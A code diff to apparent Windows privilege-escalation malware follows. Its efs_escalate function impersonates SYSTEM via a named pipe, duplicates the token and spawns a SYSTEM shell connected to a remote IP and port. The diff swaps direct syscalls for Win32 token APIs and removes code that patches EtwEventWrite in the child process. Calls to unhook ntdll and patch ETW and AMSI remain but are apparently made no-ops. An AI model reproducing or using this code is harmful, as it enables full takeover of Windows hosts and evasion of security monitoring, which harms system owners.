@@ -202,23 +202,16 @@ VOID efs_escalate(char* ip, char* port) {
     }
     printf("[+] Impersonating SYSTEM\n");
 
-    g_ssn = getSSN("NtOpenThreadToken");
-    g_syscall = getSyscallAddr("NtOpenThreadToken");
     HANDLE h_ex = NULL;
-    NTSTATUS status = iNtOpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &h_ex);
-    if (!NT_SUCCESS(status)) {
-        printf("[-] NtOpenThreadToken: 0x%lX\n", status);
+    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &h_ex)) {
+        printf("[-] OpenThreadToken: %lu\n", GetLastError());
         RevertToSelf(); CloseHandle(hpipe); return;
     }
     DBG("efs_escalate: h_ex=%p", h_ex);
 
-    g_ssn = getSSN("NtDuplicateToken");
-    g_syscall = getSyscallAddr("NtDuplicateToken");
-    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
     HANDLE h_new = NULL;
-    status = iNtDuplicateToken(h_ex, MAXIMUM_ALLOWED, &oa, FALSE, TokenPrimary, &h_new);
-    if (!NT_SUCCESS(status)) {
-        printf("[-] NtDuplicateToken: 0x%lX\n", status);
+    if (!DuplicateTokenEx(h_ex, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &h_new)) {
+        printf("[-] DuplicateTokenEx: %lu\n", GetLastError());
         CloseHandle(h_ex); RevertToSelf(); CloseHandle(hpipe); return;
     }
     printf("[+] SYSTEM token duplicated\n");
@@ -251,22 +244,6 @@ VOID efs_escalate(char* ip, char* port) {
         printf("[-] CreateProcessAsUserW: %lu\n", GetLastError());
     }
     else {
-        // patch EtwEventWrite in child
-        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
-        PVOID pEtwAddr = manual_procaddress(hNtdll, "EtwEventWrite");
-        PVOID pWriteAddr = pEtwAddr;
-        g_ssn = getSSN("NtProtectVirtualMemory");
-        g_syscall = getSyscallAddr("NtProtectVirtualMemory");
-        BYTE  patch = 0xC3;
-        SIZE_T sz = 1;
-        ULONG old = 0;
-        iNtProtectVirtualMemory(pi.hProcess, &pEtwAddr, &sz, PAGE_EXECUTE_READWRITE, &old);
-        g_ssn = getSSN("NtWriteVirtualMemory");
-        g_syscall = getSyscallAddr("NtWriteVirtualMemory");
-        SIZE_T written = 0;
-        iNtWriteVirtualMemory(pi.hProcess, pWriteAddr, &patch, 1, &written);
-        iNtProtectVirtualMemory(pi.hProcess, &pEtwAddr, &sz, old, &old);
-        FlushInstructionCache(pi.hProcess, pWriteAddr, 1);
         printf("[+] SYSTEM shell spawned\n");
 
         WaitForSingleObject(pi.hProcess, INFINITE);
@@ -274,6 +251,7 @@ VOID efs_escalate(char* ip, char* port) {
         CloseHandle(pi.hThread);
     }
     CloseHandle(h_new);
+    CloseHandle(h_ex);
     closesocket(sock);
     WSACleanup();
     } __except (CrashHandler(GetExceptionInformation()), EXCEPTION_EXECUTE_HANDLER) {
@@ -307,21 +285,11 @@ int main(void) {
     DBG("parsed ip=[%s] port=[%s] ip_len=%lu", ip, port, (unsigned long)(s-a));
 
     __try {
-        DBG(">> unhook_Ntdll");
-        if (getenv("CP_SKIP_UNHOOK") == NULL) {
-            unhook_Ntdll();
-            DBG("unhook_Ntdll returned");
-        } else {
-            DBG("unhook_Ntdll SKIPPED via CP_SKIP_UNHOOK");
-        }
-        DBG(">> EtwPatch");
-        if (getenv("CP_SKIP_ETW") == NULL) {
-            EtwPatch();
-            DBG("EtwPatch returned");
-        } else {
-            DBG("EtwPatch SKIPPED via CP_SKIP_ETW");
-        }
-        DBG(">> AmsiPatch");
+        DBG(">> unhook_Ntdll (no-op)");
+        unhook_Ntdll();
+        DBG(">> EtwPatch (no-op)");
+        EtwPatch();
+        DBG(">> AmsiPatch (no-op)");
         AmsiPatch();
         DBG(">> efs_escalate");
         efs_escalate(ip, port);
